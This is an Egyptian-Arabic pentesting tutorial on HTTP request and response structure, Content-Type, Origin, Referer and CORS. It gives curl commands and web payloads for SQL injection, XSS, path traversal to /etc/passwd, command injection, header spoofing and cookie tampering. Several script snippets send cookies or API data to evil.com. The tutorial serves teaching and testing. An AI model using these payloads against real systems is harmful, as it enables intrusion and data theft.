تمام، هنغوص أعمق في هيكل طلبات وردود HTTP ونركز على الجانب العملي مع أكواد وأوامر، وهنطبق كل حاجة من منظور اختبار الاختراق (Pentesting). هشرح كل جزء بالتفصيل وأديك أمثلة عملية، وبعد كل جزء هخلّص بالعامية المصرية، وفي الآخر هقدم خطوات استغلال عملية.

---

### **1. هيكل طلب HTTP (Request) بالتفصيل:**

#### **أ. سطر الطلب (Request Line):**
- مكون من 3 حاجات:
  - **Method:** نوع الطلب (GET, POST, PUT, DELETE, OPTIONS, HEAD).
  - **Path:** المسار اللي عايز توصل له (مثل /login أو /api/users).
  - **Protocol Version:** زي HTTP/1.1 أو HTTP/2.
- **مثال عملي:**
  - لو عايز تجيب صفحة: `GET /index.html HTTP/1.1`.
  - لو بتبعت بيانات: `POST /login HTTP/1.1`.

- **جانب عملي للبينتست:**
  - جرب تستخدم أوامر `curl` في الترمينال:
    - `curl -X GET http://example.com/index.html` (يجيبلك الصفحة).
    - `curl -X POST -d "username=test&password=123" http://example.com/login` (يبعت بيانات لتسجيل الدخول).
  - لو حابب تشوف المسار بيستجيب لطرق تانية، جرب:
    - `curl -X OPTIONS http://example.com` (يشوف السيرفر بيدعم إيه).

- **خلاصة بالعامية:**
  - "السطر ده بيقول للسيرفر أنا عايز إيه وازاي، لو غلطت فيه السيرفر هيتريق عليك ويقولك 400 أو 404."

---

#### **ب. الرؤوس (Headers):**
- دي بيانات إضافية بتساعد السيرفر يفهم طلبك:
  - `Host:` الموقع اللي بتكلمه (مطلوب في HTTP/1.1).
  - `User-Agent:` بيقول نوع المتصفح أو الأداة.
  - `Content-Type:` نوع البيانات اللي بتبعتها (مثل application/json).
  - `Cookie:` بيانات تخزين الجلسة.

- **مثال عملي:**
  - طلب بسيط:
    ```
    GET /profile HTTP/1.1
    Host: example.com
    User-Agent: Mozilla/5.0
    Cookie: session=abc123
    ```

- **جانب عملي للبينتست:**
  - جرب تزوّر الـ Headers عشان تختبر السيرفر:
    - `curl -H "User-Agent: EvilBot" http://example.com` (شوف لو السيرفر بيتصرف غريب).
    - `curl -H "Host: fake.com" http://example.com` (جرب هجمات Host Header Injection).
  - لو لقيت كوكيز، جرب تعدلها:
    - `curl -b "session=admin" http://example.com` (شوف لو بيسمح بتعديل الجلسة).

- **خلاصة بالعامية:**
  - "الرؤوس دي زي الكارنيه بتاعك، لو لعبت فيه ممكن تخدع السيرفر أو تكتشف ثغرة."

---

#### **ج. الجسم (Body):**
- موجود في الطلبات زي POST أو PUT لما بتبعت بيانات.
- بيكون JSON، فرم-urlencoded، أو حتى نص عادي.

- **مثال عملي:**
  - تبعت بيانات تسجيل دخول:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27

    username=admin&password=123
    ```

- **جانب عملي للبينتست:**
  - جرب تبعت بيانات غريبة:
    - `curl -X POST -d "username=admin' OR 1=1 --" http://example.com/login` (SQL Injection).
    - `curl -X POST -d "<script>alert('xss')</script>" http://example.com` (XSS).
  - لو السيرفر بيقبل JSON، جرب:
    - `curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"../../etc/passwd"}' http://example.com` (Path Traversal).

- **خلاصة بالعامية:**
  - "الجسم ده اللي بتحط فيه الحاجة اللي عايز تبعتها، لو لعبت صح ممكن تخترق السيرفر."

---

### **2. هيكل رد HTTP (Response) بالتفصيل:**

#### **أ. سطر الحالة (Status Line):**
- بيحتوي على:
  - **Protocol Version:** زي HTTP/1.1.
  - **Status Code:** زي 200 (OK)، 403 (ممنوع)، 500 (خطأ سيرفر).
  - **Status Message:** زي "OK" أو "Not Found".

- **مثال عملي:**
  - رد ناجح: `HTTP/1.1 200 OK`.
  - صفحة مش موجودة: `HTTP/1.1 404 Not Found`.

- **جانب عملي للبينتست:**
  - استخدم `curl` عشان تشوف الردود:
    - `curl -I http://example.com` (يجيبلك السطر والرؤوس بس).
  - لو لقيت 500، جرب تستغل خطأ السيرفر:
    - `curl -X GET http://example.com/?id=1;ls` (جرب Command Injection).

- **خلاصة بالعامية:**
  - "السطر ده بيقولك السيرفر مبسوط ولا زعلان، لو زعلان ابدأ فكر في الاستغلال."

---

#### **ب. الرؤوس (Headers):**
- بتديك معلومات عن الرد:
  - `Content-Type:` نوع البيانات (text/html, application/json).
  - `Set-Cookie:` لو السيرفر بعتلك كوكيز.
  - `Server:` نوع السيرفر (Apache, Nginx).

- **مثال عملي:**
  - رد عادي:
    ```
    HTTP/1.1 200 OK
    Content-Type: text/html
    Server: Apache/2.4.41
    Set-Cookie: session=xyz789
    ```

- **جانب عملي للبينتست:**
  - شوف الـ Server عشان تعرف نسخه وتدور على ثغرات:
    - `curl -I http://example.com | grep Server`.
  - لو لقيت `X-Powered-By: PHP/7.2.0`، ابحث عن CVEs للنسخة دي.
  - جرب تلعب في الكوكيز اللي رجعت:
    - `curl -b "session=xyz789" http://example.com/admin` (شوف لو بيديك وصول).

- **خلاصة بالعامية:**
  - "الرؤوس دي كنز، لو فهمتها صح هتعرف ازاي تهجم على السيرفر."

---

#### **ج. الجسم (Body):**
- الداتا الفعلية زي صفحة HTML أو JSON.

- **مثال عملي:**
  - رد صفحة:
    ```
    HTTP/1.1 200 OK
    Content-Type: text/html

    <html><body>Hello World</body></html>
    ```

- **جانب عملي للبينتست:**
  - لو لقيت الرد فيه إعادة توجيه (Redirect) زي `<script>window.location='evil.com'`، شك في XSS.
  - جرب تحلل الجسم:
    - `curl http://example.com | grep -i "error"` (شوف لو فيه رسايل خطأ تكشف حاجة).

- **خلاصة بالعامية:**
  - "الجسم ده اللي بتشوفه، لو لقيت فيه حاجة مش طبيعية، ابدأ العب."

---

### **خطوات عملية للاستغلال (Pentesting):**
1. **اجمع معلومات:**
   - استخدم `curl -I http://target.com` عشان تشوف الرؤوس والـ Server.
   - جرب `curl -X OPTIONS http://target.com` عشان تعرف الـ Methods المسموحة.

2. **اختبر الثغرات في الطلب:**
   - ابعت GET مع معلمات غريبة: `curl http://target.com/?id=1' OR '1'='1` (SQLi).
   - جرب POST مع بيانات خبيثة: `curl -X POST -d "data=<script>alert(1)</script>" http://target.com`.

3. **العب في الرؤوس:**
   - زوّر الـ Host: `curl -H "Host: attacker.com" http://target.com`.
   - جرب كوكيز قديمة أو معدلة: `curl -b "admin=true" http://target.com`.

4. **حلل الردود:**
   - لو لقيت 500، كرر الهجمات زي Command Injection: `curl http://target.com/?cmd=whoami`.
   - لو فيه كوكيز، جرب تستخدمها في أماكن حساسة زي /admin.

5. **استغل الجسم:**
   - ابحث عن XSS: `curl -X POST -d "input=<img src=x onerror=alert(1)>" http://target.com`.
   - لو JSON، جرب Path Traversal: `curl -d '{"file":"../config"}' http://target.com/api`.

---

### **خلاصة نهائية بالعامية:**
- "HTTP هو قلب الويب، لو فهمت الطلبات والردود وعرفت تلعب فيهم، هتكتشف ثغرات وتخترق أي حاجة، بس خلّي بالك من القانون!"
تمام، هنشرح النص ده اللي بيتكلم عن **Content-Type** و**Origin** و**Referer** و**CORS** في سياق تطبيقات الويب، بنفس الطريقة السابقة: شرح مفصل وعملي مع أكواد وأوامر، مع تركيز على اختبار الاختراق (Pentesting)، وبعد كل جزء هخلّص بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال.

---
# **أ. Content-Type (نوع المحتوى):**
- **المفهوم:** الـ `Content-Type` هو رأس (Header) في طلب HTTP بيحدد نوع البيانات اللي بتبعتها للسيرفر وازاي هتروح (Json، URL-Encoded، إلخ). بيظهر في طلبات زي POST أو PUT لما تبعت بيانات في الـ Body.
- في المثال: `uname=text&pass=test` يعني الـ `Content-Type` هو `application/x-www-form-urlencoded` لأن البيانات متكونة من أزواج اسم=قيمة مفصولة بـ `&`.

- **مثال عملي:**
  - طلب URL-Encoded:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=text&password=test
    ```
  - طلب JSON:
    ```
    POST /api/user HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {"username": "text", "password": "test"}
    ```

- **جانب عملي للبينتست:**
  - جرب تبعت بيانات:
    - `curl -X POST -d "username=test&password=123" -H "Content-Type: application/x-www-form-urlencoded" http://example.com/login`.
  - جرب نوع غلط:
    - `curl -X POST -d "<script>alert(1)</script>" -H "Content-Type: text/html" http://example.com/login` (شوف لو بيقبل).

- **خلاصة بالعامية:**
  - "الـ Content-Type ده زي اللي بيقول للسيرفر الأكلة دي إزاي معمولة، لو لخبصته ممكن تخلّي السيرفر يبلع حاجة غلط."

---

#### **ب. Origin وReferer (الأصل والمرجع):**
- **Origin:** بيحدد الدومين اللي بعت الطلب منه (مثل `https://testphp.vulnweb.com`). بيظهر في الرؤوس عشان السيرفر يعرف مصدر الطلب.
- **Referer:** بيقول الصفحة اللي كنت فيها قبل ما تبعت الطلب (زي لو جيت من لينك).

- **مثال عملي:**
  - طلب مع Origin:
    ```
    POST /api/data HTTP/1.1
    Host: example.com
    Origin: https://testphp.vulnweb.com
    ```
  - طلب مع Referer:
    ```
    GET /page HTTP/1.1
    Host: example.com
    Referer: https://testphp.vulnweb.com/login
    ```

- **جانب عملي للبينتست:**
  - جرب تزوير:
    - `curl -H "Origin: https://evil.com" http://example.com/api/data`.
    - `curl -H "Referer: https://example.com/admin" http://example.com/private` (تجاوز قيود).
  - شوف الرؤوس:
    - `curl -I http://example.com` (ابحث عن ردود مرتبطة بـ Origin).

- **خلاصة بالعامية:**
  - "الـ Origin والـ Referer زي بطاقتك اللي بتقول جيت منين، لو زوّرتها ممكن تخدع السيرفر وتدخل مكان مش ليك."

---

#### **ج. ليه الـ Origin مهم وCORS (Cross-Origin Policy):**
- **الـ Origin ليه أهمية:** السيرفر بيستخدمه عشان يتأكد إن الطلب جاي من موقعه هو مش من موقع تاني، وده بيحمي البيانات من السرقة.
- **السؤال:** لما تفتح `facebook.com` و`twitter.com` في نفس المتصفح، إيه اللي بيمنع فيسبوك يبعت طلب لتويتر ويسرق بياناتك؟
- **الإجابة:** سياسة **CORS (Cross-Origin Resource Sharing)** بتمنع المواقع تتكلم مع بعضها من المتصفح بتاعك إلا لو السيرفر سمح بكده صراحةً (زي عن طريق رأس `Access-Control-Allow-Origin`).

- **مثال عملي:**
  - طلب من فيسبوك لتويتر:
    ```
    fetch('https://twitter.com/api/data', {method: 'GET'})
    ```
    - لو مفيش CORS صح، المتصفح هيرفض الطلب.
  - رد سيرفر مع CORS:
    ```
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://facebook.com
    ```

- **جانب عملي للبينتست:**
  - جرب تكتشف CORS:
    - `curl -I -H "Origin: https://evil.com" http://example.com/api` (شوف لو بيرد `Access-Control-Allow-Origin: *`).
  - لو مرن: جرب طلبات غريبة:
    - `<script>fetch('http://example.com/api?data='+document.cookie)</script>` (XSS مع CORS ضعيف).

- **خلاصة بالعامية:**
  - "الـ Origin مع CORS زي الحارس اللي بيقول مين يدخل ومين لأ، لو الحارس نايم أو قال كله يدخل، هتسرق اللي عايزه."

---

#### **د. الثغرات والهدف كهاكرز (Vulnerabilities & Hacking Goal):**
- **CORS Misconfiguration:** لو السيرفر بيسمح بـ `*` (الكل) أو بيثق في Origin غلط، ممكن تستغله.
- **XSS مع CORS:** لو حقنت كود في الصفحة وCORS ضعيف، تقدر تبعت بيانات لموقعك.
- **Referer Bypass:** لو السيرفر بيعتمد على Referer كحماية، زوّره.

- **مثال عملي:**
  - CORS ضعيف:
    ```
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: *
    ```
    - استغلال: `<script>fetch('http://example.com/api').then(res=>res.text()).then(data=>location='http://evil.com?data='+data)</script>`.
  - Referer: `curl -H "Referer: http://example.com" http://example.com/admin` (تجاوز).

- **جانب عملي للبينتست:**
  - CORS: جرب Origins مختلفة: `curl -H "Origin: null" http://example.com/api`.
  - XSS: حقن: `<img src=x onerror="fetch('http://example.com/api').then(r=>r.text()).then(d=>alert(d))">`.
  - Referer: زوّر: `curl -H "Referer: https://example.com/login" http://example.com/private`.

- **خلاصة بالعامية:**
  - "لو لقيت ثغرة في CORS أو Origin أو Referer، هتبقى زي واحد لقى المفتاح في الباب، اسرق، زوّر، واعمل اللي عايزه."

---

### **خطوات عملية للاستغلال (Pentesting):**
1. **اكتشف الـ Content-Type:**
   - `curl -X POST -d "user=test&pass=123" http://example.com/login` (شوف الرد).
   - جرب أنواع غريبة: `curl -X POST -d "<script>alert(1)</script>" -H "Content-Type: text/plain" http://example.com`.

2. **اختبر Origin وReferer:**
   - `curl -H "Origin: https://evil.com" http://example.com/api` (شوف الرد).
   - `curl -H "Referer: https://example.com/admin" http://example.com/private` (تجاوز).

3. **هاجم CORS:**
   - `curl -I -H "Origin: https://attacker.com" http://example.com/api` (لو `*`، استغل).
   - حقن XSS: `<script>fetch('http://example.com/api').then(r=>location='http://evil.com?'+r.text())</script>`.

4. **استغل سوء التهيئة:**
   - لو CORS مرن: أرسل بيانات لموقعك.
   - لو Referer ضعيف: `curl -H "Referer: http://example.com" http://example.com/api/secret`.

5. **تحلل الثغرات:**
   - استخدم Burp Suite لتزوير Origin/Referer.
   - جرب XSS مع CORS: `<img src=x onerror="fetch('http://example.com/api')...">`.

---

### **خلاصة نهائية بالعامية:**
- "الـ Content-Type بيقول إزاي تبعت، Origin وReferer بيقولوا جيت منين، وCORS هو الحارس، لو عرفت تلعب فيهم صح هتخلّي السيرفر يفتحلك كل حاجة، بس خلّيك دماغ عشان متتركنش!"